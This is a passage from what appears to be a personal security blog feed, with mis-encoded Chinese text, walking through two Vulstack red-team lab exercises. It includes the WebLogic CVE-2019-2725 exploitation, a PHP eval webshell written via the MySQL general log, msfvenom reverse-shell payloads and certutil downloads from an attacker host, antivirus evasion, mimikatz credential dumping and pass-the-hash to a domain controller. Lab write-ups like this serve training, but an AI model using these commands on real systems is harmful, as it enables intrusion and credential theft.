title="æ€»ç»“"></a>æ€»ç»“</h1><p>flask/jinja2æ¸²æŸ“æ®·å‹¤çš„sstié—®é¢˜è€ƒå¯Ÿæ›´å¤šçš„æ˜¯å¯¹builtinså‡½æ•°/æ¨¡å—çš„ä½¿ç”¨ä»¥åŠäº†è§£ç¨‹åº¦ï¼Œå„ç§ç»•è¿‡è¿‡æ»¤æŠ€å·§ æ¢è€Œè¨€ä¹‹æ˜¯å¯¹pythonè¯­è¨€åŸºç¡€è¯­æ³•çš„ç†è§£ç¨‹åº¦å’Œé¢å‘å¯¹è±¡æ€æƒ³çš„ç†Ÿç»ƒç¨‹åº¦ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>VULSTACK çº¢é˜Ÿè¯„ä¼°(äºŒ) </title>
      <link href="2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/"/>
      <url>2020/12/16/VULSTACK-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%BA%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="Vulstackçº¢é˜Ÿè¯„ä¼°ï¼ˆäºŒï¼‰"><a href="#Vulstackçº¢é˜Ÿè¯„ä¼°ï¼ˆäºŒï¼‰" class="headerlink" title="Vulstackçº¢é˜Ÿè¯„ä¼°ï¼ˆäºŒï¼‰"></a>Vulstackçº¢é˜Ÿè¯„ä¼°ï¼ˆäºŒï¼‰</h1><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><h3 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h3><p>webserverä¸€å¼€å§‹ç”¨é»˜è®¤å¯†ç ä¸Šä¸å»ï¼Œè¿™é‡Œçš„è§£å†³æ–¹æ¡ˆæ˜¯ç™»å½•administratorè´¦æˆ·ï¼Œç„¶åä¿®æ”¹å¯†ç ã€‚</p><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><h3 id="ç½‘ç»œ"><a href="#ç½‘ç»œ" class="headerlink" title="ç½‘ç»œ"></a>ç½‘ç»œ</h3><p>æ–°å»ºä¸€ä¸ªVMNETï¼Œç¼–å·ä¸º1ï¼Œæ¨¡å¼ä¸ºhostonlyï¼Œæ¨¡æ‹Ÿå†…ç½‘ç¯å¢ƒï¼Œç½‘æ®µä¸º10.10.10.0/24</p><p>NATç½‘æ®µä¸º192.168.111.0/24</p><p>DC(å†…ç½‘)  ç½‘å¡é€‰æ‹©VMNET1ï¼ŒIPV4åœ°å€ä¸º  10.10.10.10    </p><p>WIN7(å†…ç½‘) ç½‘å¡é€‰æ‹©VMNET1ï¼ŒIPV4åœ°å€ä¸º  10.10.10.20</p><p>WEBSERVERï¼ˆå†…å¤–ç½‘ï¼‰ ç½‘å¡1é€‰æ‹©VMNET1ï¼ŒIPV4åœ°å€ä¸º10.10.10.80ï¼Œç½‘å¡2é€‰æ‹©NATï¼ŒDHCP auto configurationï¼Œæœ¬æ¬¡åœ°å€ä¸º192.168.111.128</p><h3 id="æœåŠ¡"><a href="#æœåŠ¡" class="headerlink" title="æœåŠ¡"></a>æœåŠ¡</h3><p>åœ¨<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>ç›®å½•ä¸‹å­˜åœ¨ä¸‰ä¸ªæ‰¹å¤„ç†æ–‡ä»¶<code>setDomainEnv</code>ï¼Œ<code>startManagedWebLogic</code>ï¼Œ<code>stopManagedWebLogic</code>ã€‚ç‚¹å‡»é…ç½®weblogicç¯å¢ƒã€‚</p><p>å¯åŠ¨æœåŠ¡åï¼Œè®¿é—®webæœåŠ¡å™¨ip:7001/consoleå³å¯è‡ªåŠ¨éƒ¨ç½²ã€‚</p><h1 id="webæ‰“ç‚¹"><a href="#webæ‰“ç‚¹" class="headerlink" title="webæ‰“ç‚¹"></a>webæ‰“ç‚¹</h1><p>è¿›å…¥weblogicé¡µé¢åé¦–å…ˆå°è¯•å¼±å£ä»¤weblogic/weblogicï¼Œç™»é™†ä¸è¿›å»ï¼Œè€ƒè™‘ä½¿ç”¨weblogicæ‰«æå™¨ã€‚</p><img src="http://cdn.polowong.top/static/images/vs21.jpg"><p>é€šè¿‡æ‰«æå‘ç°äº†CVE-2019-2725æ¼æ´ï¼Œå°è¯•åˆ©ç”¨ã€‚</p><p>åˆ©ç”¨å·¥å…·ï¼š</p><p><a href="https://github.com/TopScrew/CVE-2019-2725">https://github.com/TopScrew/CVE-2019-2725</a></p><p>è¿™ä¸ªè„šæœ¬æœ‰ä¸ªé—®é¢˜ï¼Œæ˜æ˜importäº†sysï¼Œrequestsç­‰ï¼Œä½†æ˜¯è¿è¡Œçš„æ—¶å€™è¿˜æ˜¯ä¼šæŠ¥æ²¡æœ‰importï¼Œå¾ˆå¥‡æ€ªï¼ŒæŠŠå®ƒæ”¾åˆ°if name=mainé‡Œé¢å°±å¥½äº†ï¼ˆè¿™é‡Œå¤§æ¦‚ç‡æ˜¯name==mainå¸¦æ¥çš„æ‰§è¡Œé¡ºåºçš„é—®é¢˜ï¼‰</p><p>é¡ºåˆ©è¿è¡Œè„šæœ¬åï¼Œå³å¯è·å¾—ä¸€ä¸ªwebshellï¼Œåœ°å€ä¸ºï¼š</p><p><a href="http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig">http://192.168.111.128:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=ipconfig</a></p><p>å…ˆç”¨webshellæŸ¥çœ‹systeminfo,å‘ç°ä¸º64ä½æ“ä½œç³»ç»Ÿï¼Œå°è¯•ä½¿ç”¨msfvenomç”Ÿæˆ64ä½çš„reverse shell</p><p>msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.111.129 lport=4444  a- x64 -f exe &gt;/root/Desktop/shell.exe</p><p>kaliå¯åŠ¨apacheæœåŠ¡ï¼Œå¹¶å°†webshellæ”¾åˆ°/var/www/htmlç›®å½•ä¸‹</p><p>åˆ©ç”¨Windowsè‡ªå¸¦çš„å·¥å…· certutilä¸‹è½½webshell</p><p>certutil.exe -urlcache -split -f <a href="http://192.168.111.129/shell.exe">http://192.168.111.129/shell.exe</a></p><p>ä½†æ˜¯ä¸è¡Œï¼Œç›´æ¥è¢«360å¹²æ‰äº†ã€‚</p><p>ä½¿ç”¨javaååºåˆ—åŒ–ç»ˆææµ‹è¯•å·¥å…·ç›´æ¥ä¸Šä¼ å†°èshellï¼Œç›®å½•ä¸º</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\wlserver_10<span class="number">.3</span>\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</span><br></pre></td></tr></table></figure><img src="http://cdn.polowong.top/static/images/vs22.jpg"><p>å¯ä»¥ç›´æ¥è¿ä¸Š~</p><p>ä¸‹é¢å°†shellåå¼¹åˆ°msfä¸Šï¼Œè¿›è¡Œä¸‹ä¸€æ­¥çš„æ¸—é€ã€‚</p><h1 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h1><p>åœ¨meterpreteré‡Œé¢ä½¿ç”¨run get_local_subnets è·å–æœåŠ¡å™¨ç½‘å¡ä¿¡æ¯</p><p>çœ‹åˆ°10ç½‘æ®µï¼Œæ·»åŠ 10ç½‘æ®µè·¯ç”±ï¼š</p><p>run autoroute -s 10.10.10.0/24</p><p>ç„¶åå¯åŠ¨socksä»£ç†</p><p>æˆ‘è¿™é‡Œå¯¹ä»£ç†çš„ç†è§£æ˜¯åœ¨msfå¯åŠ¨socks5ä»£ç†åï¼Œè®¾ç½®ç›‘å¬IPä¸ç«¯å£ï¼Œä»»ä½•ä½¿ç”¨proxychainsè¿›è¡Œçš„åŠ¨ä½œéƒ½ä¼šè½¬å‘åˆ°è®¾ç½®å¥½çš„ç›‘å¬ä¸ç«¯å£ä¸Šï¼Œä¸æ­¤åŒæ—¶msfè®¾ç½®äº†é€šå¾€é¶æœºå†…ç½‘çš„è·¯ç”±ï¼Œä¾¿å¯å°†è¯·æ±‚é€šè¿‡ï¼ˆå‘½ä»¤ï¼‰å†…ç½‘ä¸»æœºå‘é€å‡ºå»ã€‚</p><p>çœ‹ä¸€ä¸‹net user /domain å‘ç°äº†åŸŸå†…æœ‰äº”ä¸ªç”¨æˆ·</p><p>æŸ¥è¯¢åŸŸæ§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><p>é€šè¿‡ipconfig /allæŸ¥è¯¢IPåœ°å€ä¸DNSæœåŠ¡å™¨åœ°å€ï¼ˆä¸€èˆ¬DNSæœåŠ¡å™¨åœ°å€æ˜¯DCï¼‰</p><p>ä½¿ç”¨net config workstation æŸ¥è¯¢å·¥ä½œç«™æƒ…å†µ</p><img src="http://cdn.polowong.top/static/images/vs23.jpg"><p>å¯ä»¥ç¡®å®šï¼Œå½“å‰åŸŸä¸ºde1ay.com</p><p>æ¥ä¸‹æ¥ä½¿ç”¨ladonæ¢æµ‹å†…ç½‘ä¸»æœºå­˜æ´»æƒ…å†µ</p><p>åˆ©ç”¨å¤±è´¥ï¼Œæ— å›æ˜¾ï¼Œåœ¨è™šæ‹ŸæœºæŸ¥çœ‹å‘ç°è¢«360æ‹¦æˆªæ‰äº†ã€‚</p><p>ç”±äºjavaçš„meterpreteræ²¡æœ‰mimikatzæ¨¡å—ï¼Œæ‰€ä»¥è¿™é‡Œå°è¯•ä¸Šä¼ Windowsçš„shellå¹¶ä¸”åŠ è½½mimikatzæ¨¡å—ã€‚ï¼ˆå¿˜è®°äº†ä¹‹å‰ç”Ÿæˆçš„shellè¢«å¹²æ‰äº†ã€‚ã€‚æ²¡åŠæ³•ï¼Œå°è¯•å…æ€ï¼‰</p><p>ä½¿ç”¨goå…æ€csæˆåŠŸäº†ï¼ŒæˆåŠŸä¸Šçº¿</p><img src="http://cdn.polowong.top/static/images/vs25.jpg"><p>æ¥ä¸‹æ¥å°è¯•æ·»åŠ ç®¡ç†å‘˜ç”¨æˆ·</p><p>net user polosec admin@123 /add</p><p>net localgroup Administrators polosec /add</p><p>ç”±äº360æ‹¦æˆª æ·»åŠ å¤±è´¥ã€‚</p><p>é€šè¿‡æ¼æ´è¿›è¡Œæƒé™æå‡ï¼Œæ‹¿åˆ°ä¸€ä¸ªsystemæƒé™çš„shellã€‚</p><h2 id="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"><a href="#æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº" class="headerlink" title="æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº"></a>æ¢æµ‹åŸŸå†…å­˜æ´»ä¸»æœº</h2><p>å°†csä¼šè¯æ´¾ç”Ÿç»™msf</p><p>é¦–å…ˆCSæ–°å»ºä¸€ä¸ªforeign listenerï¼Œé€‰æ‹©httpsï¼Œè®°ä½è®¾ç½®çš„ç«¯å£å·å’Œhsotã€‚</p><p>msfä¸€æ ·çš„é…ç½®</p><p>æ³¨æ„è¿™é‡Œä¸€å®šè¦é€‰reverse http å¦åˆ™meterpreterä¼šdie</p><img src="http://cdn.polowong.top/static/images/vs26.jpg"><p>ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ç”¨ICMPåè®®æ¢æµ‹ä¸»æœºå­˜æ´»ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 10.10.10.%I | findstr &quot;TTL&#x3D;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä½¿ç”¨arp -a æŸ¥çœ‹arpç¼“å­˜</p><img src="http://cdn.polowong.top/static/images/vs27.jpg"><p>ç¡®å®šä¸»æœºå¤§æ¦‚ä¸º:</p><p>10.10.10.10(DC),</p><p>10.10.10.80,</p><p>10.10.10.201</p><p>ç›®å‰10.10.10.80å·²ç»è¢«æ‹¿ä¸‹ï¼Œä¸‹é¢å°è¯•å¯¹10.10.10.10ä»¥åŠ10.10.10.201ä¸»æœºè¿›è¡Œæ¸—é€ã€‚</p><h2 id="æ¸—é€åŸŸå†…ä¸»æœº"><a href="#æ¸—é€åŸŸå†…ä¸»æœº" class="headerlink" title="æ¸—é€åŸŸå†…ä¸»æœº"></a>æ¸—é€åŸŸå†…ä¸»æœº</h2><p>é€šè¿‡PASS THE HASH çš„æ–¹å¼ä¼ é€’NTLM hashå®ç°ä¸Šçº¿DCå’ŒåŸŸå†…ä¸»æœºã€‚</p><p>å…·ä½“æ–¹æ³•ï¼š</p><p>åœ¨CSä¸­ view target -add æ·»åŠ DCçš„IPï¼Œç‚¹å‡»jump ï¼ŒPS EXEC ï¼Œé€‰æ‹©ä¸€ä¸ªåŒåŸŸçš„è´¦å·å¯†ç è¿›è¡ŒPTHï¼Œå³å¯é¡ºåˆ©ä¸Šçº¿DCã€‚</p><p>ä¸Šçº¿DCåå†ç”¨mimikatzæŠ“ä¸€ä¸‹å¯†ç ï¼Œç„¶ååˆ©ç”¨åŒæ ·çš„æ–¹æ³•ä¸Šçº¿ä¸»æœº10.10.10.201ã€‚</p><img src="http://cdn.polowong.top/static/images/vs28.jpg"><p>é¡ºåˆ©ä¸Šçº¿ä¸»æœº10.10.10.201ï¼š</p><img src="http://cdn.polowong.top/static/images/vs29.jpg"><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>é€šè¿‡æœ¬æ¬¡å¯¹vulstacké¶åœºçš„å­¦ä¹ ï¼Œ</p><p>è¿›ä¸€æ­¥äº†è§£äº†CS MSFçš„ç”¨æ³•ï¼ŒåŠ æ·±äº†å¯¹bypass uac ã€ææƒçš„è®¤è¯†ï¼Œå­¦ä¹ äº†åˆæ­¥çš„å…æ€æŠ€å·§ï¼›</p><p>å­¦ä¼šäº†åœ¨msfä¸­å¦‚ä½•é…ç½®è·¯ç”±å¯¹å†…ç½‘è¿›è¡Œæ‰«æï¼Œå­¦ä¹ äº†å‡ ä¸ªå¸¸ç”¨çš„ææƒæ–¹å¼ æ¯”å¦‚MS14058 MS15051ï¼›</p><p>ä½¿ç”¨pthçš„æ–¹å¼ä¸Šçº¿åŸŸå†…ä¸»æœºç­‰ç­‰ã€‚ã€‚</p><p>ç›®å‰å­˜åœ¨çš„é—®é¢˜ä¹Ÿéå¸¸å¤šï¼ŒåŒ…æ‹¬ä¸å¤ªäº†è§£CSï¼ŒCSçš„shellæ‰çº¿ä¸çŸ¥é“æ˜¯ä»€ä¹ˆé—®é¢˜ï¼Œä»¥åŠè¿˜æœ‰å¾ˆå¤šå¾ˆå¤šç°åœ¨è¿˜æ²¡æœ‰å­¦ä¹ åˆ°çš„çŸ¥è¯†ã€‚</p><p>é’ˆå¯¹å½“å‰é—®é¢˜çš„å­¦ä¹ ç›®æ ‡ï¼šäº†è§£PTHï¼ŒæŒæ¡mimikatzçš„ç”¨æ³•ï¼Œäº†è§£å¦‚ä½•bypass uacï¼Œè®¤è¯†æ›´å¤šçš„ææƒæ–¹æ³•ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> å†…ç½‘æ¸—é€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vulstack çº¢é˜Ÿè¯„ä¼°(ä¸€) å†…ç½‘æ¸—é€</title>
      <link href="2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
      <url>2020/12/03/vulstack-%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0-%E4%B8%80-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="vulstack-çº¢é˜Ÿè¯„ä¼°ï¼ˆä¸€ï¼‰"><a href="#vulstack-çº¢é˜Ÿè¯„ä¼°ï¼ˆä¸€ï¼‰" class="headerlink" title="vulstack çº¢é˜Ÿè¯„ä¼°ï¼ˆä¸€ï¼‰"></a>vulstack çº¢é˜Ÿè¯„ä¼°ï¼ˆä¸€ï¼‰</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡åšå†…ç½‘æ¸—é€çš„ç›¸å…³å†…å®¹ï¼Œåšä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="å‡†å¤‡å·¥ä½œ"><a href="#å‡†å¤‡å·¥ä½œ" class="headerlink" title="å‡†å¤‡å·¥ä½œ"></a>å‡†å¤‡å·¥ä½œ</h2><p>ä¸‹è½½é•œåƒï¼Œè™šæ‹Ÿæœºé»˜è®¤å¯†ç hongrisec@2019ï¼Œç™»é™†åæœ‰ä¸¤å°éœ€è¦æ”¹å¯†ç ï¼Œæ³¨æ„å¯†ç çš„æ ¼å¼ã€‚ã€‚åˆ«å¿˜äº†å†é‡è£…â€“ æˆ‘çš„å¯†ç æ˜¯<?php admin@123 éšè—ä¸‹ ?></p><p>å¯¹ç½‘ç»œçš„éƒ¨ç½²éœ€è¦ä¸€å®šçš„è®¡ç®—æœºç½‘ç»œåŸºç¡€çŸ¥è¯†ã€‚</p><p>kali ç½‘å¡ï¼š NAT</p><p>webæœåŠ¡å™¨ï¼ˆDMZåŒºï¼‰ï¼š ç½‘å¡1 NAT  ç½‘å¡2 VMNET1ï¼ˆhostonlyï¼‰</p><p>å†…ç½‘æœåŠ¡å™¨1ï¼ˆåŸŸæ§ï¼‰  ç½‘å¡ VMNET1 hostonly</p><p>å†…ç½‘æœåŠ¡å™¨2 ï¼š ç½‘å¡ VMNET1 hostonly</p><p>éƒ¨ç½²å¥½åç”±äºWindows7å¼€äº†é˜²ç«å¢™ï¼Œå¯ä»¥å‘å¤–pingä½†æ˜¯pingä¸åŠ¨è¯¥æœºå™¨ï¼Œç”¨ä¸¤å°å†…ç½‘ä¸»æœºpingä¸€ä¸‹è¯•è¯•èƒ½ä¸èƒ½pingåŠ¨ã€‚</p><img src="http://cdn.polowong.top/static/images/vs11.jpg"><p>æ­£å¸¸æƒ…å†µä¸‹</p><p>ä¸»æœºå¯ä»¥pingé€šä¸¤å°å†…ç½‘ä¸»æœºï¼Œwin7å¯ä»¥pingé€šä¸¤å°å†…ç½‘ä¸»æœºï¼Œkaliå¯ä»¥pingé€šwin7ã€‚</p><h2 id="webæ¸—é€å·¥ä½œ"><a href="#webæ¸—é€å·¥ä½œ" class="headerlink" title="webæ¸—é€å·¥ä½œ"></a>webæ¸—é€å·¥ä½œ</h2><p>å¼€å±€phpstudyæ¢é’ˆï¼ŒçŒœä¸€çŒœæ•°æ®åº“è´¦å·å¯†ç root/root</p><p>phpmyadminé»˜è®¤è·¯å¾„ï¼Œæ—¥è¿›å»å°è¯•å†™æ—¥å¿—getshellã€‚</p><p>é¦–å…ˆçœ‹çœ‹æ˜¯å¦å¼€æ—¥å¿—äº†</p><p> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/show.html&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>SHOW</strong></a> <strong>VARIABLES</strong> <a href="http://192.168.52.3/phpMyadmin/url.php?url=http://dev.mysql.com/doc/refman/5.5/en/string-comparison-functions.html%23operator_like&token=86bd43ee3e6e2d48528a7169af7ea2b4"><strong>LIKE</strong></a> â€˜%general%â€™ </p><p>æ²¡å¼€ï¼Œå¼€ä¸€ä¸‹ã€‚</p><p>set golbal   general_log=on;</p><p>è®¾ç½®ä¸‹æ—¥å¿—è·¯å¾„ï¼ˆæ¢é’ˆä¸­æŸ¥çœ‹ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file &#x3D;&#39;C:&#x2F;phpStudy&#x2F;WWW&#x2F;2.php&#39;;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥æŸ¥è¯¢ä¸€ä¸‹ï¼Œå†…å®¹æ˜¯shellã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &#39;&lt;?php eval($_POST[a]); ?&gt;&#39;;</span><br></pre></td></tr></table></figure><p>ä¹‹åè®¿é—®èšå‰‘é“¾æ¥shellå°±å¯ä»¥äº†</p><p>è¿ä¸Šshellåwhoamiä¸€ä¸‹ï¼Œå‘ç°æ˜¯administratoræƒé™ï¼Œåœ¨GODåŸŸä¸‹(?å¯¹åŸŸçš„æ¦‚å¿µè¿˜ä¸å¤ªäº†è§£)</p><p>æ¥ä¸‹æ¥ä½¿ç”¨msfvenomç”Ÿæˆshellè¿æ¥ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.54.2 lport&#x3D;5555 -f exe&gt;shell.exe</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.54.2</span><br><span class="line">set lport 5555</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure><p>åœ¨èšå‰‘æ‰§è¡Œexeæ–‡ä»¶å³å¯è·å¾—åå¼¹shell</p><p>ä¸å¤ªä¼šç”¨msfï¼Œæ‰§è¡Œå‘½ä»¤ä¸€ç›´å•¥éƒ½æ²¡æœ‰ï¼Œæœ€åçŸ¥é“msfæœ‰ä¸€å¥—è‡ªå·±çš„å‘½ä»¤ï¼Œè¾“å…¥shellåè·å¾—äº†é¶æœºçš„shellã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp</span><br><span class="line">å¯ç”¨RDPç™»å½•ã€‚</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥å°è¯•ä¸Šä¼ cs çš„beaconã€‚</p><img src="http://cdn.polowong.top/static/images/vs12.jpg"><p>csé¦–å…ˆè®¾ç½®listenerï¼Œç”ŸæˆWindowsçš„32ä½å¯æ‰§è¡Œç¨‹åº a.exe</p><p>é€šè¿‡msfçš„meterpreterä¸Šä¼ åˆ°ç›®æ ‡ä¸»æœºå¹¶æ‰§è¡Œ</p><p>upload /root/Desktop/1.exe</p><p>execute -f 1.exe</p><p>ä¹‹ååœ¨cså¯ä»¥çœ‹åˆ°æœåŠ¡å™¨ä¸Šçº¿ã€‚</p><img src="http://cdn.polowong.top/static/images/vs13.jpg"><h2 id="msf-meterpreter-ç®€ä»‹"><a href="#msf-meterpreter-ç®€ä»‹" class="headerlink" title="msf meterpreter ç®€ä»‹"></a>msf meterpreter ç®€ä»‹</h2><p> Meterpreteræ˜¯Metasploitæ¡†æ¶ä¸­çš„ä¸€ä¸ªæ‰©å±•æ¨¡å—ï¼Œä½œä¸ºæº¢å‡ºæˆåŠŸä»¥åçš„æ”»å‡»è½½è·ä½¿ç”¨ï¼Œæ”»å‡»è½½è·åœ¨æº¢å‡ºæ”»å‡»æˆåŠŸä»¥åç»™æˆ‘ä»¬è¿”å›ä¸€ä¸ªæ§åˆ¶é€šé“ã€‚ä½¿ç”¨å®ƒä½œä¸ºæ”»å‡»è½½è·èƒ½å¤Ÿè·å¾—ç›®æ ‡ç³»ç»Ÿçš„ä¸€ä¸ªMeterpreter shellçš„é“¾æ¥ã€‚Meterpreter shellä½œä¸ºæ¸—é€æ¨¡å—æœ‰å¾ˆå¤šæœ‰ç”¨çš„åŠŸèƒ½ï¼Œæ¯”å¦‚æ·»åŠ ä¸€ä¸ªç”¨æˆ·ã€éšè—ä¸€äº›ä¸œè¥¿ã€æ‰“å¼€shellã€å¾—åˆ°ç”¨æˆ·å¯†ç ã€ä¸Šä¼ ä¸‹è½½è¿œç¨‹ä¸»æœºçš„æ–‡ä»¶ã€è¿è¡Œcmd.exeã€æ•æ‰å±å¹•ã€å¾—åˆ°è¿œç¨‹æ§åˆ¶æƒã€æ•è·æŒ‰é”®ä¿¡æ¯ã€æ¸…é™¤åº”ç”¨ç¨‹åºã€æ˜¾ç¤ºè¿œç¨‹ä¸»æœºçš„ç³»ç»Ÿä¿¡æ¯ã€æ˜¾ç¤ºè¿œç¨‹æœºå™¨çš„ç½‘ç»œæ¥å£å’ŒIPåœ°å€ç­‰ä¿¡æ¯ã€‚å¦å¤–Meterpreterèƒ½å¤Ÿèº²é¿å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚åœ¨è¿œç¨‹ä¸»æœºä¸Šéšè—è‡ªå·±,å®ƒä¸æ”¹å˜ç³»ç»Ÿç¡¬ç›˜ä¸­çš„æ–‡ä»¶,å› æ­¤HIDS[åŸºäºä¸»æœºçš„å…¥ä¾µæ£€æµ‹ç³»ç»Ÿ]å¾ˆéš¾å¯¹å®ƒåšå‡ºå“åº”ã€‚æ­¤å¤–å®ƒåœ¨è¿è¡Œçš„æ—¶å€™ç³»ç»Ÿæ—¶é—´æ˜¯å˜åŒ–çš„,æ‰€ä»¥è·Ÿè¸ªå®ƒæˆ–è€…ç»ˆæ­¢å®ƒå¯¹äºä¸€ä¸ªæœ‰ç»éªŒçš„äººä¹Ÿä¼šå˜å¾—éå¸¸å›°éš¾ã€‚</p><p> æœ€å,Meterpreterè¿˜å¯ä»¥ç®€åŒ–ä»»åŠ¡åˆ›å»ºå¤šä¸ªä¼šè¯ã€‚å¯ä»¥æ¥åˆ©ç”¨è¿™äº›ä¼šè¯è¿›è¡Œæ¸—é€ã€‚åœ¨Metasploit Frameworkä¸­ï¼ŒMeterpreteræ˜¯ä¸€ç§åæ¸—é€å·¥å…·ï¼Œå®ƒå±äºä¸€ç§åœ¨è¿è¡Œè¿‡ç¨‹ä¸­å¯é€šè¿‡ç½‘ç»œè¿›è¡ŒåŠŸèƒ½æ‰©å±•çš„åŠ¨æ€å¯æ‰©å±•å‹Payloadã€‚è¿™ç§å·¥å…·æ˜¯åŸºäºâ€œå†…å­˜DLLæ³¨å…¥â€ç†å¿µå®ç°çš„ï¼Œå®ƒèƒ½å¤Ÿé€šè¿‡åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹å¹¶è°ƒç”¨æ³¨å…¥çš„DLLæ¥è®©ç›®æ ‡ç³»ç»Ÿè¿è¡Œæ³¨å…¥çš„DLLæ–‡ä»¶ã€‚å…¶ä¸­ï¼Œæ”»å‡»è€…ä¸ç›®æ ‡è®¾å¤‡ä¸­Meterpreterçš„é€šä¿¡æ˜¯é€šè¿‡Stagerå¥—æ¥å­—å®ç°çš„meterpreterä½œä¸ºåæ¸—é€æ¨¡å—æœ‰å¤šç§ç±»å‹ï¼Œå¹¶ä¸”å‘½ä»¤ç”±æ ¸å¿ƒå‘½ä»¤å’Œæ‰©å±•åº“å‘½ä»¤ç»„æˆï¼Œæå¤§çš„ä¸°å¯Œäº†æ”»å‡»æ–¹å¼ã€‚</p><p> éœ€è¦è¯´æ˜çš„meterpreteråœ¨æ¼æ´åˆ©ç”¨æˆåŠŸåä¼šå‘é€ç¬¬äºŒé˜¶æ®µçš„ä»£ç å’ŒmeterpreteræœåŠ¡å™¨dllï¼Œæ‰€ä»¥åœ¨ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µä¸‹ç»å¸¸å‡ºç°æ²¡æœ‰å¯æ‰§è¡Œå‘½ä»¤ï¼Œæˆ–è€…ä¼šè¯å»ºç«‹æ‰§è¡Œhelpä¹‹åå‘ç°ç¼ºå°‘å‘½ä»¤ã€‚ è¿ä¸Švpnåˆåœ¨å†…ç½‘ä¸­ä½¿ç”¨psexecå’Œbind_tcpçš„æ—¶å€™ç»å¸¸ä¼šå‡ºç°è¿™ç§æƒ…å†µ</p><h2 id="å†…ç½‘ä¿¡æ¯æœé›†"><a href="#å†…ç½‘ä¿¡æ¯æœé›†" class="headerlink" title="å†…ç½‘ä¿¡æ¯æœé›†"></a>å†…ç½‘ä¿¡æ¯æœé›†</h2><p>åœ¨csä¸­å°è¯•ä½¿ç”¨mimikatzè·å–ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç </p><img src="http://cdn.polowong.top/static/images/vs14.jpg"><p>ä½¿ç”¨ladonæ‰«æå†…ç½‘</p><img src="http://cdn.polowong.top/static/images/vs15.jpg"><p>å¾—åˆ°ç»“æœï¼š</p><p>192.168.52.3 139 445 3389</p><p>192.168.52.138 80 445 139 389</p><p>192.168.52.141 21 139</p><p>192.168.52.138ä¸»æœº389ç«¯å£å¼€å¯äº†LDAPæœåŠ¡ï¼Œå¯èƒ½æ˜¯DCã€‚</p><p>ä¸‹é¢å°è¯•æ·»åŠ è·¯ç”±ï¼Œä½¿ç”¨Windows7ä½œä¸ºè·³æ¿æœºè®¿é—®Windows2003</p><img 